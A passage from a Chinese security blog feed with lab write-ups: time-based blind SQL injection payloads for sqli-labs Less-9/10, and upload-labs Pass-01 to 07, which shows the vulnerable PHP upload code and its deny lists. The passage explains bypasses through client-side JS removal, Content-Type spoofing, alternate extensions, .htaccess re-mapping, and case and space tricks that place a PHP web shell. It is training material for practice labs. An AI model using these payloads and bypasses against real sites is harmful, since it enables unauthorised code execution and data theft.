class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输入?id=1后仍与上题无异</p>
<p>时间型盲注和bool型盲注应用场景不同之处在报错的返回上，从less-8我们知道，输入合法时他会返回正常页面“You are in……”，而非法输入时他没有返回任何东西，于是，我们可以根据这个特点跑盲注，通过他不同的返回页面来判断我们匹配的字符是否正确，而在less-9中合法输入与非合法输入它都返回一个页面，就是“You are in…..”</p>
<p>这样，我们就不能根据他页面的返回内容来判断匹配结果了，因此我们需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：<br><strong>?id=1’ and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/9.1.jpg">

<p>这里的意思是，如果数据库名首字母的ascii码大于115，那么执行sleep(5)，延时5秒，此时标签栏会变成缓冲，于是，我们就可以判断匹配的结果了，盲注脚本与less-8类似，只需要加入sleep函数即可</p>
<h1 id="Less-10-基于时间的双引号盲注"><a href="#Less-10-基于时间的双引号盲注" class="headerlink" title="Less-10 基于时间的双引号盲注"></a><a href="#Less-10-基于时间的双引号盲注" title="Less-10 基于时间的双引号盲注"></a>Less-10 基于时间的双引号盲注</h1><p>把第九题的单引号改为双引号即可<br><strong>?id=1” and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))–+</strong></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Upload-labs]]></title>
      <url>/2019/07/31/Upload-labs/</url>
      <content type="html"><![CDATA[<h1 id="文件上传漏洞练习"><a href="#文件上传漏洞练习" class="headerlink" title="文件上传漏洞练习"></a>文件上传漏洞练习</h1><p>Upload-labs是一个帮你总结各种类型的上传漏洞的靶场，包括常见的文件上传漏洞<br>项目地址：<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><img src="/2019/07/31/Upload-labs/mind-map.png" title="mind-map">
<img src="/2019/07/31/Upload-labs/sum-up.png" title="mind-map">

<h1 id="构造优质上传漏洞Fuzz字典"><a href="#构造优质上传漏洞Fuzz字典" class="headerlink" title="构造优质上传漏洞Fuzz字典"></a>构造优质上传漏洞Fuzz字典</h1><p><strong><a href="http://www.hacksec.cn/Tools/866.html" target="_blank" rel="noopener">http://www.hacksec.cn/Tools/866.html</a></strong></p>
<h1 id="Pass-01-js检查"><a href="#Pass-01-js检查" class="headerlink" title="Pass-01 js检查"></a>Pass-01 js检查</h1><p>直接上传php木马，发现前端报错：</p>
<img src="/2019/07/31/Upload-labs/0x01-1.jpg" title="0x01-1">

<p>在这使用传统的抓包，修改后缀名。是可以上传成功的，但是不是这一关的目的，我们看看源代码分析一波</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，只是在客户端使用js对不合法图片进行检查，我们可以尝试绕过</p>
<p>如果是前端验证我们可以选择火狐浏览器中的NoScript插件禁用js,这样我们就可以安全的上传</p>
<img src="/2019/07/31/Upload-labs/0x01-2.jpg" title="0x01-2">

<p>但对于前端的过滤没有必要这么复杂，其实，还可以这样，直接把过滤的函数<strong>cheakfile()</strong>在上传前删掉，也可以上传成功</p>
<img src="/2019/07/31/Upload-labs/0x01-3.jpg" title="0x01-3">

<p>或者修改参数</p>
<img src="/2019/07/31/Upload-labs/0x01-4.jpg" title="0x01-4">

<p>在白名单中加上.php</p>
<img src="/2019/07/31/Upload-labs/0x01-5.png" title="0x01-5">

<p>复制该函数于控制台并回车</p>
<img src="/2019/07/31/Upload-labs/0x01-6.png" title="0x01-6">

<p>随后即可成功上传</p>
<h1 id="Pass-02-验证Content-type"><a href="#Pass-02-验证Content-type" class="headerlink" title="Pass-02 验证Content-type"></a>Pass-02 验证Content-type</h1><p>本题中使用传统的抓包，单纯修改后缀名是不行的<br>查看源码观察一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="基础姿势："><a href="#基础姿势：" class="headerlink" title="基础姿势："></a>基础姿势：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>] – 被上传文件的名称</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] – 被上传文件的类型</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"size"</span>] – 被上传文件的大小，以字节计</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>] – 存储在服务器的文件的临时副本的名称</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"error"</span>] – 由文件上传导致的错误代码</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(file,newloc) 函数将上传的文件移动到新位置。</span><br><span class="line">参数  描述</span><br><span class="line">file    必需。规定要移动的文件。</span><br><span class="line">newloc  必需。规定文件的新位置。</span><br><span class="line">如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 <span class="literal">false</span>。</span><br><span class="line">如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 <span class="literal">false</span>，此外还会发出一条警告。</span><br></pre></td></tr></table></figure>

<p>发现只是对<strong>文件类型Content-type</strong>进行过虑<br>于是上传xxx.php文件抓包修改content-type为image/jpeg或其他绕过</p>
<img src="/2019/07/31/Upload-labs/0x02-1.png" title="0x02-1">

<p>修改为：</p>
<img src="/2019/07/31/Upload-labs/0x02-2.png" title="0x02-2">

<p>点击Forward发送</p>
<h1 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h1><p>不能上传，但能上传 php.jpg，php.asd 说明是黑名单限制</p>
<img src="/2019/07/31/Upload-labs/0x03-1.jpg" title="0x03-1">

<p>发现是黑名单判断，服务器端禁止上传’.asp’,’.aspx’,’.php’,’.jsp’后缀的脚本文件<br>其采用的黑名单，php的话有时候php3、php4、php5、phtml、pht这些后缀也是可以被解析的（配置的原因），其他语言也有类似的情况，需要尝试：</p>
<img src="/2019/07/31/Upload-labs/0x03-2.png" title="0x03-2">

<p>上传木马抓包</p>
<img src="/2019/07/31/Upload-labs/0x03-3.png" title="0x03-3">


<p>修改文件名后缀（配置不同，可解析的后缀也不同）：</p>
<img src="/2019/07/31/Upload-labs/0x03-4.png" title="0x03-4">

<h1 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04 .htaccess绕过"></a>Pass-04 .htaccess绕过</h1><p>上传.htaccess文件<br><strong>需要：|1.mod_rewrite模块开启|2.AllowOverride All|</strong></p>
<p>该题的源码为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现同样有黑名单过滤，但是发下有一个文件是没有过滤，也是我们上传过程中经常用到的<strong>.htaccess</strong></p>
<h2 id="htaccess重点姿势"><a href="#htaccess重点姿势" class="headerlink" title=".htaccess重点姿势"></a>.htaccess重点姿势</h2><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
<p><strong>启用.htaccess</strong>，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。它里面有这样一段代码：AllowOverride None，如果我们把None改成All</p>
<img src="/2019/07/31/Upload-labs/0x04-1.jpg" title="0x04-1">
<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
<p>可以通过上传.htaccess文件然后将该文件夹下的所有例如.jpg的文件都按照脚本语言解析，上传如下内容的<strong>.htaccess</strong>文件：</p>
<img src="/2019/07/31/Upload-labs/0x04-2.png" title="0x04-2">
<p>意思是将文件夹下的one.jpg文件按照php格式去解析，然后再上传一个文件名为one.jpg内容为木马的文件，然后访问，可以执行代码（其中.jpg也可换成test等其他，但其他也需改变）</p>
<p>或</p>
<img src="/2019/07/31/Upload-labs/0x04-3.png" title="0x04-3">

<p>或</p>
<img src="/2019/07/31/Upload-labs/0x04-4.png" title="0x04-4">
<p>这样所有文件都会解析为php</p>
<p>上传成功后，在上传个图片马：</p>
<img src="/2019/07/31/Upload-labs/0x04-5.jpg" title="0x04-5">

<p>发现成功上传，可以访问一下，发现成功执行：</p>
<img src="/2019/07/31/Upload-labs/0x04-6.jpg" title="0x04-6">

<h1 id="Pass-05-大小写绕过——Windows"><a href="#Pass-05-大小写绕过——Windows" class="headerlink" title="Pass-05 大小写绕过——Windows"></a>Pass-05 大小写绕过——Windows</h1><p>拿源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在第五关代码中没有这个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure>

<p>所以我们可以通过大小写进行绕过了： </p>
<img src="/2019/07/31/Upload-labs/0x05-1.png" title="0x05-1">
<p>抓包：</p>
<img src="/2019/07/31/Upload-labs/0x05-2.jpg" title="0x05-2">
<p>回显：</p>
<img src="/2019/07/31/Upload-labs/0x05-3.jpg" title="0x05-3">

<h1 id="Pass-06-空格绕过——Windows"><a href="#Pass-06-空格绕过——Windows" class="headerlink" title="Pass-06 空格绕过——Windows"></a>Pass-06 空格绕过——Windows</h1><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关比第五关少了这样的一句代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>所以可以后缀名+空格的形式去绕过,抓包</p>
<img src="/2019/07/31/Upload-labs/0x06-1.png" title="0x06-1">
<p>修改：</p>
<img src="/2019/07/31/Upload-labs/0x06-2.png" title="0x06-2">

<h1 id="Pass-07-点绕过——Windows"><a href="#Pass-07-点绕过——Windows" class="headerlink" title="Pass-07 点绕过——Windows"></a>Pass-07 点绕过——Windows</h1><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">     